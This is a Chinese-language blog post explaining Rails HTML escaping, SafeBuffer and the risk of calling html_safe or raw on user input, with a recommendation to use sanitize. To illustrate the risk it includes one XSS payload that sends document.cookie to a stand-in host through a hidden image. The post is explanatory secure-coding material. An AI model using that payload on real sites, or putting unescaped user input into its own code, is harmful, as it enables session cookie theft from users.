---
layout: post
title: Rails中的html string
---

在html语言中，**'"<>&**这个5个符号有着特殊的作用，如定义标签、属性，嵌入JS代码等，但是有时候又需要显示这些字符。那么如何区分呢？

显示的时候转义。

在Rails的active_support/core_ext/string/output_safety.rb中，定义了HTML_ESCAPE = { '&' => '&amp;',  '>' => '&gt;',   '<' => '&lt;', '"' => '&quot;', "'" => '&#39;' }

每个被显示的字符串都会变成SafeBuffer对象的。

如：

```
<%= <script>"alert('ok')"</script> %>  #=> &lt;script&gt;alert(&#39;ok&#39;)&lt;/script&gt;

<%= <script>"alert('ok')"</script>.html_safe %>  #=> <script>"alert('ok')"</script>
```

在Rails中，默认会将输出显示string转码，即调用html_escape；

而如果加上**html_safe**就是认为这个string是安全的，就不去转码而直接写入的html页面里，html_safe和<%= raw "..." %>作用基本相同。

那么这么就是很危险的，因为如果是显示用户的输入，那么用户就可以嵌入一段JS代码，进行XSS攻击了，效果如下：

```
<%= "xss: <script>var img = document.createElement('img');img.style.display='none';img.src='http://xss-server.com/?cookie='+document.cookie;document.getElementsByTagName('body')[0].appendChild(img);</script>".html_safe %>
```

上面就把当前用户的cookie发送走了。

如果真需要不转义那些字符，比如想嵌入一个自己的个性化样式，那么请用sanitize。

如下，所谓调用html_safe，其实是创建一个SafeBuffer实例，然后有一个属性@html_safe为true，这样就不用被html_escape了。

```
class String
  # Marks a string as trusted safe. It will be inserted into HTML with no
  # additional escaping performed. It is your responsibilty to ensure that the
  # string contains no malicious content. This method is equivalent to the
  # `raw` helper in views. It is recommended that you use `sanitize` instead of
  # this method. It should never be called on user input.
  def html_safe
    ActiveSupport::SafeBuffer.new(self) # 在ruby里，这种用法很常见——把自己作为参数。
  end
end
```

# 参考

* https://github.com/rails/rails/blob/master/activesupport/lib/active_support/core_ext/string/output_safety.rb
* https://ruby-china.org/topics/16633
* http://stackoverflow.com/questions/4251284/raw-vs-html-safe-vs-h-to-unescape-html